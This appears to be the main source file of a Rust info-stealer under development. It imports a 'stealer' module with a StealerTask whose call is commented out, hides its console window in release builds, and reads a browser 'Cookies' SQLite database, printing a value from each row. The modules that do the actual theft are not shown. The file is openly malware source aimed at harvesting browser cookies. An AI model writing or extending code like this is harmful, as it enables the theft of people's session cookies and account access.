#![no_main]
#![no_std]

#![cfg_attr(
    debug_assertions,
    windows_subsystem = "console"
)]

#![cfg_attr(
    not(debug_assertions),
    windows_subsystem = "windows"
)]

#![allow(unsafe_op_in_unsafe_fn)]

use sqlite::{DatabaseReader, TableRecordExtension};
extern crate alloc;

use stealer::StealerTask;
use tasks::Task;
use utils::log_debug;
use utils::path::Path;

mod panic;

#[global_allocator]
static ALLOC: wee_alloc::WeeAlloc = wee_alloc::WeeAlloc::INIT;

#[unsafe(no_mangle)]
#[allow(unused_unsafe)]
pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
    let out = Path::new("output");
    let _ = out.remove_dir_all();
    let _ = out.mkdir();
    
    // unsafe {
    //     StealerTask::new().run(&out);
    // }

    let path = Path::new("target") / "Cookies";
    let bytes = path.read_file().unwrap();
    let db = sqlite::read_sqlite3_database_by_bytes(&bytes).unwrap();
    let iter = db.read_table("Cookies").unwrap();

    for row in iter {
        log_debug!("{}\n", row.get_value(1).unwrap());
    }

    0
}
